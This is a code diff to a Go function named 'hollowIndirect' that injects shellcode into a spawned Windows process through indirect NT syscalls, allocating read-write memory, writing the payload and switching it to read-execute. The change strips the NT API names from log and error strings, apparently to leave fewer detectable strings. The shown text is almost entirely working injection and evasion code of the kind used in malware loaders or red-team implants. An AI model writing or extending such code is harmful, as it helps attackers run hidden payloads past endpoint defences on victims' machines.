@@ -314,29 +314,29 @@ func hollowIndirect(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInf
 	// Step 2: Allocate RW memory via NtAllocateVirtualMemory
 	regionSize := uintptr(len(shellcode))
 	var remoteAddr uintptr
-	sb.WriteString(fmt.Sprintf("[*] Allocating %d bytes via NtAllocateVirtualMemory...\n", len(shellcode)))
+	sb.WriteString(fmt.Sprintf("[*] Allocating %d bytes...\n", len(shellcode)))
 
 	status := IndirectNtAllocateVirtualMemory(uintptr(pi.Process), &remoteAddr, &regionSize,
 		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 	if status != 0 {
 		_ = syscall.TerminateProcess(pi.Process, 1)
-		return sb.String(), fmt.Errorf("NtAllocateVirtualMemory failed: NTSTATUS 0x%X", status)
+		return sb.String(), fmt.Errorf("memory allocation failed: NTSTATUS 0x%X", status)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Allocated memory at 0x%X\n", remoteAddr))
 
-	// Step 3: Write shellcode via NtWriteVirtualMemory
-	sb.WriteString("[*] Writing shellcode via NtWriteVirtualMemory...\n")
+	// Step 3: Write shellcode
+	sb.WriteString("[*] Writing shellcode...\n")
 
 	var bytesWritten uintptr
 	status = IndirectNtWriteVirtualMemory(uintptr(pi.Process), remoteAddr,
 		uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
 	if status != 0 {
 		_ = syscall.TerminateProcess(pi.Process, 1)
-		return sb.String(), fmt.Errorf("NtWriteVirtualMemory failed: NTSTATUS 0x%X", status)
+		return sb.String(), fmt.Errorf("memory write failed: NTSTATUS 0x%X", status)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes\n", bytesWritten))
 
-	// Step 4: Change protection to RX via NtProtectVirtualMemory
+	// Step 4: Change protection to RX
 	protectAddr := remoteAddr
 	protectSize := uintptr(len(shellcode))
 	var oldProtect uint32
@@ -344,7 +344,7 @@ func hollowIndirect(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInf
 		PAGE_EXECUTE_READ, &oldProtect)
 	if status != 0 {
 		_ = syscall.TerminateProcess(pi.Process, 1)
-		return sb.String(), fmt.Errorf("NtProtectVirtualMemory failed: NTSTATUS 0x%X", status)
+		return sb.String(), fmt.Errorf("memory protection change failed: NTSTATUS 0x%X", status)
 	}
 	sb.WriteString("[+] Memory protection set to RX\n")
 
